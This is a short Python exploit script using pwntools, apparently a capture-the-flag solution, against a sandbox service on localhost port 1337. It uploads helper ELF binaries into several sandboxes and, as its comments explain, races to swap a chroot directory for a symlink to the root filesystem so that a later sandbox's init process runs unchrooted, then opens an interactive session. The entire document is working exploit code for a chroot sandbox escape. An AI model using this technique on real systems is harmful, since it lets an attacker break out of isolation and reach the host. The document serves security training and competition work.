from pwn import *
from time import sleep

def i2b(i): return str(i).encode()

def send_elf(path):
    with open(path, 'rb') as f:
        content = f.read()
    p.sendlineafter(b'elf len? ', i2b(len(content)))
    p.sendafter(b'data? ', content)    


def start_sandbox(path):
    p.sendlineafter(b'Exit\n> ', b'1')
    send_elf(path)


def run_elf(path, sandbox_idx):
    p.sendlineafter(b'Exit\n> ', b'2')
    p.sendlineafter(b'which sandbox? ', sandbox_idx)
    send_elf(path)


p = remote('localhost', 1337)
# context.log_level='debug'
# Create two sandboxes
start_sandbox(b'c/blocker') # 0 (receiver)
start_sandbox(b'c/blocker') # 1 (sender)

# Receiver and sender should substitude /tmp/chroots/2 with symlink to /, so that the next init process will be 
# unchrooted. 
run_elf(b'c/receiver', b'0')
run_elf(b'c/sender', b'1')

# Start sandbox, the init process should be unchrooted. In fact it will be unchrooted only if we win race condition.
start_sandbox(b'c/init') # 2
sleep(1)
context.log_level = 'debug'
run_elf(b'c/blocker', b'2')


p.interactive()